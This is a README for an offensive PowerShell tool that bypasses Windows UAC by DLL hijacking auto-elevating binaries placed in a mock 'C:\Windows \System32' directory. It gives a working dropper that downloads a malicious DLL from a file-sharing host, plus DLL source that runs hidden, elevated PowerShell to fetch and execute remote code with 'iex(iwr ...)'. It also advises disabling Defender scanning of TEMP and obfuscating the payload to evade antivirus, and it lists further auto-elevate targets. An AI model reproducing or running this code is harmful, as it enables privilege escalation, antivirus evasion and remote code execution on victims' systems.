<!-- # Powershell UAC bypass -->
<img src="https://i.snipboard.io/b2ozpR.jpg"></img>

⚠ ONLY USE FOR EDUCATIONAL PURPOSES ⚠ 
<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#deployment">Deployment</a>
	  <ul>
	  	<li> <a href="#execution-timeline">Execution timeline</a></li>
		<li> <a href="#creating-the-payload">Creating the payload</a></li>
	  </ul>
    </li>
        <li>
      <a href="#terms">Terms And Definitions</a>
          <ul>
        <li><a href="#what-is-uac">What is UAC?</a></li>
        <li><a href="#dll-hijacking">DLL Hijacking</a></li>
        <li><a href="#mock-directories">Mock Directories</a></li>
    </ul>
    </li>
    <li><a href="#auto-elavate-applications">Auto elavate applications</a></li>
    
  </ol>
</details>

---


# Deployment

---

## Execution timeline

This powershell payload is simply an advanced dropper, paving way for the exploit we use to be ran with administrative permissions.

1. The powershell payload is run
2. It creates a directory "C:\Windows \System32"
3. It copies an autoelavate program from its original location to the mock directory
   1. C:\Windows\System32\WinSAT.exe -> C:\windows \System32\winSAT.exe
4. It downloads your malicious DLL from your C2
5. It starts the auto elevate application, then deletes the parent mock directory



---
## Creating the payload

First, we need to create the file to be dropped, If you dont have a server setup - use  [Filebin](https://filebin.net/). Though it has had a history of deleting files with no notice.

To easiliy create said DLL  - I would modify [This template](https://github.com/salasak/prxdll_templates) with the code below. You can also use the template providied in this projects source code.

prxdll_version/dllmain.c  - source/dll_template/dllmain.c
```c++
#include "pch.h"
#include "prxdll.h"
#include "windows.h"
BOOL APIENTRY DllMain(
	const HINSTANCE instance,
	const DWORD reason,
	const PVOID reserved)
{
	switch (reason) {
	case DLL_PROCESS_ATTACH:
		WinExec("powershell -NoProfile -ExecutionPolicy bypass -windowstyle hidden -Command \"Start-Process -verb runas powershell\" \"'-NoProfile -windowstyle hidden -ExecutionPolicy bypass -Command iex( iwr https://textbin.net/raw/yw9xytxlsa )\" '\"", 1);
		DisableThreadLibraryCalls(instance);
		return prx_attach(instance);
	case DLL_PROCESS_DETACH:
		prx_detach(reserved);
		break;
	}
	return TRUE;
}
```
The code above is ran with administrative permissions, however - the powershell session is not in admin. For the powershell command you use, I suggest the iex method for its ease and shortness.
```powershell
iex (iwr c2.url) # I suggest textbin for its minimal guidelines compared to pastebin
```


Next you need to choose your autoelavate application. I prefer to use winSAT.exe as there is nothing appears when ran. Heres some other <a href="#auto-elavate-applications">Auto elavate applications</a>.

Now edit the powershell dropper
```powershell
New-Item '\\?\C:\Windows \System32' -ItemType Directory
Set-Location -Path '\\?\C:\Windows \System32'
copy C:\Windows\System32\WinSAT.exe "C:\windows \System32\winSAT.exe"
Invoke-WebRequest -Uri 'https://filebin.net/bajzrgruy6h83o4n/version.dll' -OutFile 'version.dll'
Start-Process -Filepath 'C:\windows \System32\winSAT.exe'
Start-Sleep -s 1
Remove-Item '\\?\C:\Windows \' -Force -Recurse
```

First modification:
* Build your DLL using visual studio code and upload it to filebin. My DLL adds a windows defender preference to not scan the TEMP directory
* Replace the Invoke-WebRequest Uri with your link and replace the copy and start procsess argument with the location of your autoelavate application.
* Replace every new line with a semicolon and convert it into a batch script to bypass exectuion policies.
```cmd
powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy bypass -Command "Yourcodehere"
```
And boom! You can execute that system command bypass UAC!

For a final step, [Obfuscate](https://github.com/danielbohannon/Invoke-Obfuscation) your code, and fetch and execute it to bypass most antiviruses.

```batch
powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy bypass -Command "iex ( iwr textbinurl)"
```

Remember - you can program this into most high level languages - as all you need to do is execute a system command!


---
<br>

# Terms

## What Is UAC
Microsoft introduced UAC (User Account Control) with Windows Vista and Windows Server 2008.\
In short terms - UAC aims to improve the security of Microsoft Windows by giving programs standard user privileges until an administrator authorizes an increase or elevation of permissions.  [Wikipedia](https://en.wikipedia.org/wiki/User_Account_Control#Features)

<br>

## DLL Hijacking
DLL Hijacking means a program will load and execute a malicious DLL contained in the same folder as a data file opened by these programs.
[Wikipedia](https://en.wikipedia.org/wiki/Dynamic-link_library#DLL_hijacking)

<br>

## Mock directories

Mock directories are folders with a trailing space. For example \
```
C:\Windows \System32
```


See the space " " between "Windows" and "\System32".\


##  Auto elavate applications
<table bgcolor="" cellpadding="2" cellspacing="0" style="background: rgb(255, 255, 255); width: 643px;">
	<colgroup><col width="341">
	<col width="75">
	<col width="213">
	</colgroup><tbody><tr bgcolor="" style="background: rgb(229, 229, 229);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<strong><font color="#000000"><font face="">Executable</font></font></strong></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<strong><font color="#000000"><font face="">DLL</font></font></strong></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<strong><font color="#000000"><font face="">Comment</font></font></strong></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">ComputerDefaults.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods.</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">EASPolicyManagerBrokerHost.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">fodhelper.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			settings and can be used to bypass UAC using other methods</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">FXSUNATD.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">msconfig.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">OptionalFeatures.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			Windows Optional Features</font></font></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">sdclt.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods; opens Windows Backup</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">ServerManager.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">ServerManager.exe
			is not present by default</font></font></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">systemreset.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">sysprep.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Creates
			sub folder.&nbsp;</font></font><strong><font color="#000000"><font face="">Sysprep
			process has to be killed directly after UAC bypass, otherwise
			sysprep is executed!</font></font></strong></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">SystemSettingsAdminFlows.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">WinSAT.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">WSReset.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			Windows Store</font></font></p>
		</td>
	</tr>
</tbody></table>
